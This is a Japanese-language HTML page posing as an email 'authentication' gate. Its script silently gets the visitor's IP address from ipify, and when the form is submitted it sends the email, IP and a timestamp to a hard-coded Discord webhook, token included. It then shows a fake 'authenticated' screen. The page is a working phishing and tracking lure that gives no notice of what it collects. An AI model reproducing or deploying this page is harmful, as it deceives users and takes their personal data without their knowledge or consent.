<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>認証</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container, .success-screen {
            background-color: #1e1e1e;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        h1 {
            margin-top: 0;
            font-size: 24px;
        }
        .glitch {
            color: #00ff00;
            font-size: 32px;
            font-weight: bold;
            text-transform: uppercase;
            text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00;
            animation: glitch 725ms infinite;
        }
        @keyframes glitch {
            0%   { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
            15%  { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
            16%  { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff, -0.05em -0.05em 0 #fffc00; }
            49%  { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff, -0.05em -0.05em 0 #fffc00; }
            50%  { text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff, 0 -0.04em 0 #fffc00; }
            99%  { text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff, 0 -0.04em 0 #fffc00; }
            100% { text-shadow: -0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
        }
        input[type="email"] {
            width: calc(100% - 20px);
            padding: 12px;
            margin: 20px 0;
            border: 1px solid #333;
            background-color: #2a2a2a;
            color: #ffffff;
            border-radius: 6px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #00ff00;
            color: #121212;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #00cc00;
        }
        button:disabled {
            background-color: #555;
            cursor: not-allowed;
        }
        .success-screen {
            display: none;
        }
        .success-screen h1 {
            color: #00ff00;
            font-size: 36px;
            margin: 0 0 20px;
        }
        .error-msg {
            color: #ff4444;
            margin-top: 10px;
            min-height: 20px;
        }
    </style>
</head>
<body>

    <!-- 入力画面 -->
    <div class="container" id="authScreen">
        <h1 class="glitch">認証</h1>
        <p>アクセスを続行するには、メールアドレスを入力してください。</p>
        <form id="authForm">
            <input type="email" id="email" placeholder="メールアドレス" required autocomplete="email">
            <button type="submit" id="submitBtn">認証する</button>
            <div class="error-msg" id="errorMsg"></div>
        </form>
    </div>

    <!-- 成功画面（隠しておく） -->
    <div class="success-screen" id="successScreen">
        <h1>認証されました</h1>
        <p>これでアクセスが可能になりました！</p>
        <p style="margin-top:30px; font-size:14px; color:#aaa;">
            しばらくすると自動で次のページに移動します...<br>
            （またはここをクリック → <a href="#" style="color:#00ff00;">進む</a>）
        </p>
    </div>

    <script>
        // IP取得
        let userIP = "取得中...";

        window.onload = async function() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (err) {
                console.error("IP取得失敗", err);
                userIP = "取得できませんでした";
            }
        };

        // フォーム送信
        document.getElementById('authForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            const errorMsg = document.getElementById('errorMsg');

            if (!email) {
                errorMsg.textContent = "メールアドレスを入力してください";
                return;
            }

            // 送信中はボタン無効化
            submitBtn.disabled = true;
            submitBtn.textContent = "認証中...";
            errorMsg.textContent = "";

            try {
                const webhookUrl = "https://discord.com/api/webhooks/1468960055163621584/tJKhKF6YwABWOWY3v01-gc0IlsuaIPRrOkyGurBDOUd32_hu4w2u0qV9GYM8uJmDNk5";

                const payload = {
                    content: "**新しい認証情報**",
                    embeds: [{
                        title: "認証ログ",
                        color: 0x00ff00,
                        fields: [
                            { name: "IP", value: userIP, inline: true },
                            { name: "メールアドレス", value: email, inline: true },
                            { name: "時刻", value: new Date().toLocaleString('ja-JP'), inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    throw new Error(`Webhookエラー: ${response.status}`);
                }

                // 成功 → 画面切り替え
                document.getElementById('authScreen').style.display = 'none';
                document.getElementById('successScreen').style.display = 'flex';
                document.getElementById('successScreen').style.flexDirection = 'column';
                document.getElementById('successScreen').style.alignItems = 'center';

                // 例: 5秒後に自動でどこかに飛ばしたい場合
                // setTimeout(() => { window.location.href = "https://your-next-page.com"; }, 5000);

            } catch (error) {
                console.error("送信失敗", error);
                errorMsg.textContent = "送信に失敗しました。もう一度お試しください。";
                submitBtn.disabled = false;
                submitBtn.textContent = "認証する";
            }
        });
    </script>
</body>
</html>
